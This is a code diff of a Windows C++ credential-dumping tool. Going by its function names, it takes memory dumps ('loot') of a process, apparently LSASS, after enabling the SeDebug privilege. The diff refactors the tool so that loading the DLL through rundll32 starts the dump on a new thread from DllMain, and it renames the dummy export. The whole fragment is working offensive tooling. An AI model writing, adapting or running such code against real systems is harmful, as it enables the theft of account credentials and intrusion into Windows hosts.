@@ -216,16 +216,6 @@ BOOL pssMiniDumpLoot() {
 	return cDump;
 }
 
-// if version is above minimum Windows 8.1, Windows Server 2012 R2 use pssMiniDumpLoot, else use miniDumpLoot
-BOOL dumpLoot() {
-	if (verifyRtlVersions(6, 3, 10, 0)==TRUE) {
-		return pssMiniDumpLoot();
-	}
-
-	// if version requirement minimum is not met, dump without snapshot clone
-	return miniDumpLoot();
-}
-
 // ref: https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
 // win32 method of enabling access token privileges
 BOOL setPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
@@ -296,10 +286,30 @@ BOOL IsElevated() {
 	return fRet;
 }
 
+// if version is above minimum Windows 8.1, Windows Server 2012 R2 use pssMiniDumpLoot, else use miniDumpLoot
+BOOL dumpLoot() {
+	setRtlSEDebug();
+
+	if (verifyRtlVersions(6, 3, 10, 0)==TRUE) {
+		return pssMiniDumpLoot();
+	}
+
+	// if version requirement minimum is not met, dump without snapshot clone
+	return miniDumpLoot();
+}
+
+// wrapper so dumpLoot can be called as type LPTHREAD_START_ROUTINE 
+DWORD dumpLootThreadWrapper(LPVOID lpParameter) {
+	return dumpLoot();
+}
+
+// global thead handle for dll execution
+HANDLE tHandle;
 // dummy export function for rundll32
 #define EXPORT extern "C" __declspec(dllexport)
-EXPORT void CALLBACK dumbExport(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
+EXPORT void CALLBACK testDLL(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
 {
+	WaitForSingleObject(tHandle, INFINITE);
 }
 
 // Change build type .DLL
@@ -309,8 +319,9 @@ BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpRese
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-		setRtlSEDebug();
-		dumpLoot();
+		// https://devblogs.microsoft.com/oldnewthing/20070904-00/?p=25283
+		tHandle = CreateThread(NULL, 0, dumpLootThreadWrapper, NULL, 0, NULL);
+		break;
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
@@ -323,6 +334,5 @@ BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpRese
 // Properties->General->Configuration Type:Application(.exe)
 // Properties->Linker->System->SubSystem:CONSOLE
 int main() {
-	setRtlSEDebug();
 	dumpLoot();
 }
